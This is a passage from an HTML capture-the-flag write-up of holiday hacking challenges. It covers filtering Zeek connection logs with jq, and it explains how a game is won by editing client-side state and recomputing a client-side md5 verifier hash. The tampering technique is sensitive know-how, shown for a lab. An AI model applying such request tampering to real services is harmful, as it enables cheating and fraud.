<p>See <a href="#obj10">Objective 10</a>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_open_the_sleigh_workshop_door">Open the Sleigh Workshop Door</h3>
<div class="paragraph">
<p>See <a href="#obj11">Objective 11</a>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_zeek_json_analysis">Zeek JSON Analysis</h3>
<div class="paragraph">
<p>Task: Identify the destination IP with the longest connection duration.
Run runtoanswer to submit.</p>
</div>
<div class="paragraph">
<p>Solution: Not too elegant, but here it is working:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>jq '. | select(.duration&gt;500000)' conn.log
runtoanswer</pre>
</div>
</div>
<div class="imageblock">
<div class="content">
<img src="images/zeekjson.png" alt="zeekjson">
</div>
</div>
<div class="paragraph">
<p>The IP with the longest connection duration is "13.107.21.200". This challenge
is an intro to <a href="#obj12">Objective 12</a>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_holiday_hack_trail">Holiday Hack Trail</h3>
<div class="paragraph">
<p>Task: Win the game (travel to the end of the trail).</p>
</div>
<div class="paragraph">
<p>Solution: Game state parameters are stored on the client side
and the client sends the parameters to the server in every turn.</p>
</div>
<div class="paragraph">
<p>The server trusts the client and accepts everything the client sends
without validation. In "Hard" difficulty there is a verifier hash, but
it is also calculated on the client side.</p>
</div>
<div class="paragraph">
<p>As a consequence, the long trail can be "bypassed" on the 1st turn
by a properly modified request and we can jump to the end of trail
and win the game immediately.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/trail_00.png" alt="trail 00">
</div>
<div class="title">Holiday Hack Trail: A modified request in hard difficulty (with recalculated hash)</div>
</div>
<div class="paragraph">
<p>Note, that the hash is md5(sum of various integer parameters).</p>
</div>
<div class="paragraph">
<p>After submitting the edited request, winning is automatic.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/trail_01.png" alt="trail 01">
</div>
<div class="title">Holiday Hack Trail: Winning in hard difficulty</div>
</div>
<div class="paragraph">
<p>Looking at the victory page source, there are 10 hints referring to
the 10 browser task in <a href="#obj11">Objective 11</a>.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/trail_02.png" alt="trail 02">
</div>
<div class="title">Holiday Hack Trail: Hints for Objective 11 in the victory source</div>
</div>
</div>
<div class="sect2">
<h3 id="_filter_out_poisoned_sources_of_weather_data">Filter Out Poisoned Sources of Weather Data</h3>
<div class="paragraph">
<p>See <a href="#obj12">Objective 12</a>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_you_won">You Won!</h3>
<div class="imageblock">
<div class="content">
<img src="images/win_00.png" alt="win 00">
</div>
<div class="title">You Won: In The Bell Tower</div>
</div>
<div class="imageblock">
<div class="content">
<img src="images/win_01.png" alt="win 01">
</div>
<div class="title">You Won: Letter Of Wintry Magic</div>
</div>
</div>
</div>
</div>
</div>
<div id="footer">
<div id="footer-text">
Version 1.0<br>
Last updated 2020-02-14 09:02:57 +0100
</div>
</div>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/github.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/highlight.min.js"></script>
<script>hljs.initHighlighting()</script>
</body>
</html>